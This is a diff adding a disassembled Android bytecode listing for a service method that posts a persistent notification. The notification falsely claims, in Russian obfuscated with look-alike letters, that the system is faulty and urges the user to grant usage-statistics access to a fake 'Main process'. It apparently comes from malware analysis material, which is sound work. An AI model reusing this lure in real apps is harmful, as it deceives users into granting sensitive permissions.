@@ -1,0 +1,75 @@
+# Lorg/ceremony/perfect/Rob;->a()V [access_flags=private]
+#
+# Parameters:
+# local registers: v0...v7
+#
+# - return:void
+
+a-BB@0x0 : [ a-BB@0x10 a-BB@0xe4 ]
+	0       (00000000) const/4              v6, 0
+	1       (00000002) const/4              v5, 1
+	2       (00000004) sget                 v0, Landroid/os/Build$VERSION;->SDK_INT I
+	3       (00000008) const/16             v1, 26
+	4       (0000000c) if-lt                v0, v1, +6c
+
+a-BB@0x10 : [ a-BB@0x9c ]
+	5       (00000010) new-instance         v0, Landroid/app/NotificationChannel;
+	6       (00000014) const-string         v1, 'org.ceremony.perfect.OAK'
+	7       (00000018) const-string         v2, 'Depression'
+	8       (0000001c) invoke-direct        v0, v1, v2, v5, Landroid/app/NotificationChannel;-><init>(Ljava/lang/String; Ljava/lang/CharSequence; I)V
+	9       (00000022) iget-object          v1, v7, Lorg/ceremony/perfect/Rob;->a Landroid/app/NotificationManager;
+	10      (00000026) invoke-virtual       v1, Ljava/lang/Object;->getClass()Ljava/lang/Class;
+	11      (0000002c) move-result-object   v1
+	12      (0000002e) new-instance         v2, Ljava/lang/StringBuilder;
+	13      (00000032) invoke-direct        v2, Ljava/lang/StringBuilder;-><init>()V
+	14      (00000038) const-string         v3, 'createNotification'
+	15      (0000003c) invoke-virtual       v2, v3, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+	16      (00000042) move-result-object   v2
+	17      (00000044) const-string         v3, 'Channel'
+	18      (00000048) invoke-static        v3, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;
+	19      (0000004e) move-result-object   v3
+	20      (00000050) invoke-virtual       v2, v3, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+	21      (00000056) move-result-object   v2
+	22      (00000058) invoke-virtual       v2, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
+	23      (0000005e) move-result-object   v2
+	24      (00000060) new-array            v3, v5, [Ljava/lang/Class;
+	25      (00000064) const-class          v4, Landroid/app/NotificationChannel;
+	26      (00000068) aput-object          v4, v3, v6
+	27      (0000006c) invoke-virtual       v1, v2, v3, Ljava/lang/Class;->getMethod(Ljava/lang/String; [Ljava/lang/Class;)Ljava/lang/reflect/Method;
+	28      (00000072) move-result-object   v1
+	29      (00000074) iget-object          v2, v7, Lorg/ceremony/perfect/Rob;->a Landroid/app/NotificationManager;
+	30      (00000078) new-array            v3, v5, [Ljava/lang/Object;
+	31      (0000007c) aput-object          v0, v3, v6
+	32      (00000080) invoke-virtual       v1, v2, v3, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object; [Ljava/lang/Object;)Ljava/lang/Object;
+	33      (00000086) new-instance         v0, Landroid/app/Notification$Builder;
+	34      (0000008a) invoke-virtual       v7, Lorg/ceremony/perfect/Rob;->getApplicationContext()Landroid/content/Context;
+	35      (00000090) move-result-object   v1
+	36      (00000092) const-string         v2, 'org.ceremony.perfect.OAK'
+	37      (00000096) invoke-direct        v0, v1, v2, Landroid/app/Notification$Builder;-><init>(Landroid/content/Context; Ljava/lang/String;)V
+
+a-BB@0x9c : 
+	38      (0000009c) const                v1, 17301659 # [2.497968935749755e-38]
+	39      (000000a2) invoke-virtual       v0, v1, Landroid/app/Notification$Builder;->setSmallIcon(I)Landroid/app/Notification$Builder;
+	40      (000000a8) move-result-object   v1
+	41      (000000aa) const-string         v2, 'Оcнoвнoй прoцeсc'
+	42      (000000ae) invoke-virtual       v1, v2, Landroid/app/Notification$Builder;->setContentTitle(Ljava/lang/CharSequence;)Landroid/app/Notification$Builder;
+	43      (000000b4) move-result-object   v1
+	44      (000000b6) const-string         v2, "Сиcтемa не кoррeктнo рaботaет, вaм необходимо включить дocтуп к cтатиcтикe для 'Оcнoвнoй прoцeсc'"
+	45      (000000ba) invoke-virtual       v1, v2, Landroid/app/Notification$Builder;->setContentText(Ljava/lang/CharSequence;)Landroid/app/Notification$Builder;
+	46      (000000c0) move-result-object   v1
+	47      (000000c2) invoke-static        Ljava/lang/System;->currentTimeMillis()J
+	48      (000000c8) move-result-wide     v2
+	49      (000000ca) invoke-virtual       v1, v2, v3, Landroid/app/Notification$Builder;->setWhen(J)Landroid/app/Notification$Builder;
+	50      (000000d0) invoke-virtual       v0, Landroid/app/Notification$Builder;->build()Landroid/app/Notification;
+	51      (000000d6) move-result-object   v0
+	52      (000000d8) const/16             v1, 1294
+	53      (000000dc) invoke-virtual       v7, v1, v0, Lorg/ceremony/perfect/Rob;->startForeground(I Landroid/app/Notification;)V
+	54      (000000e2) return-void          
+
+a-BB@0xe4 : [ a-BB@0x9c ]
+	55      (000000e4) new-instance         v0, Landroid/app/Notification$Builder;
+	56      (000000e8) invoke-virtual       v7, Lorg/ceremony/perfect/Rob;->getApplicationContext()Landroid/content/Context;
+	57      (000000ee) move-result-object   v1
+	58      (000000f0) invoke-direct        v0, v1, Landroid/app/Notification$Builder;-><init>(Landroid/content/Context;)V
+	59      (000000f6) goto                 -2d
+
